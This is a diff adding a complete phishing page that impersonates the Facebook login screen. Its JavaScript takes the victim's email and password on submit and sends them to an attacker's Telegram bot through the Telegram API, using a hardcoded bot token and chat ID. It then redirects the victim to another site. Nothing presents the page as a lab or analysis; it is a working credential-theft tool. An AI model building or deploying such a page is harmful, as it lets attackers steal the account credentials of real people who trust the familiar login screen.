@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        /* Body styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #e9eff1; /* Official Facebook login page background color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Language Selection Dropdown - Positioned at the top center */
+        .language-select {
+            position: absolute;
+            top: 10px; /* Positioned at the top */
+            left: 50%;
+            transform: translateX(-50%); /* Center horizontally */
+            font-size: 14px;
+            z-index: 10;
+        }
+
+        .language-select select {
+            padding: 2px;
+            font-size: 14px;
+        }
+
+        /* Login container */
+        .login-container {
+            background-color: transparent; /* Transparent background for the container */
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 0 0px rgba(0, 0, 0, 0.1); /* Light shadow */
+        }
+
+        /* Facebook logo and title */
+        .logo-container {
+            margin-bottom: 20px;
+        }
+
+        .logo-container h1 {
+            font-size: 36px;
+            color: #1877f2; /* Facebook blue color */
+            margin-bottom: 20px;
+        }
+
+        /* Input fields and button */
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #165eab;
+        }
+
+        /* Footer and Sign Up link */
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        /* Meta text at the bottom */
+        .meta {
+            font-size: 50px;
+            color: #888;
+            text-align: center;
+            margin-top: 100px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Language Selection Dropdown (Top center) -->
+    <div class="language-select">
+        <label for="language">Language:</label>
+        <select id="language">
+            <option value="en">US</option>
+            <option value="bn">বাংলা</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <!-- More languages can be added -->
+        </select>
+    </div>
+
+    <div class="login-container">
+        <!-- Facebook Logo with title -->
+        <div class="logo-container">
+            <!-- Replace "logo.png" with the actual path to your logo image -->
+            <img src="background.png" alt="Logo" style="max-width: 100px; margin-bottom: 20px;">
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or Phone Number" required>
+            <input type="password" id="password" placeholder="Password" required>
+
+            <button type="submit">Login</button>
+        </form>
+
+        <div class="footer">
+            <p>Create a new Facebook account</p>
+            <a href="#">Sign Up</a>
+        </div>
+    </div>
+
+    <!-- Meta Text at the bottom -->
+    <div class="meta">
+        <!-- This is where the logo is displayed -->
+        <img src="mata.png" alt="Logo" style="max-width: 150px;">
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            let botToken = "7992356703:AAGGmo7eTksT5oS-tzkwoY8k9DAtUkR9u_c"; // Your bot token
+            let chatId = "6341598098"; // Your chat ID
+
+            let message = `🔥 New Login 🔥\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            let data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+               // alert("Order Submitted successfully sent!");
+                window.location.href = "https://tiktok.com"; // Redirect to Facebook
+            })
+            .catch(error => console.error("Error:", error));
+        });
+    </script>
+
+</body>
+</html>
